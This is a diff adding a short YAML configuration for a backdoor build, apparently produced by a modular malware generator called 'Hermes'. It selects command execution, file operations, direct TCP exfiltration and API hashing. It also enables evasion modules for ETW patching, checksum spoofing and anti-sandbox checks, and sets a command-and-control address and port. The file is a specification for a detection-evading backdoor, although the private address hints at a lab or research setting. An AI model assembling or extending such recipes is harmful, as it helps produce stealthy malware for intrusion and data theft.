@@ -1,0 +1,18 @@
+name: backdoor_cs_v2_mutated
+description: Auto-generated recipe by Hermes (c)
+core:
+- core/emit_buffer
+- core/run_cmd
+- core/file_ops
+collectors: []
+exfil: exfil/tcp_direct_v2
+arch: arch/sequential
+resources: true
+api_resolve: api_resolve/api_hash_crc32
+evasion:
+- evasion/etw_full_patch
+- evasion/checksum_spoof
+- evasion/anti_sandbox
+vars:
+  C2_IP: 10.0.2.2
+  C2_PORT: '9001'
